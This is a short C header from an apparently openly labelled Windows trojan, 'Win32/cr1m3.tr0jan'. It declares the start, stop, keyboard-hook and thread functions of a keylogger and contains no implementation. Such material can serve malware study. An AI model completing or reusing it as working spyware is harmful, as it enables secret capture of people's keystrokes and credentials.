/*
	Educational purposes only
	GPL LICENSE:  @Cr1m3 / JennyLab
	Win32/cr1m3.tr0jan
*/

#ifndef __KEYLOGGER_H_FILE
#define __KEYLOGGER_H_FILE


int __keylogger_start(void);
int __keylogger_stop(void);
LRESULT __stdcall ProcKeyboardHook(int nCode, WPARAM wParam, LPARAM lParam);
unsigned long __stdcall MainKeyboard(void *lParams);

#endif
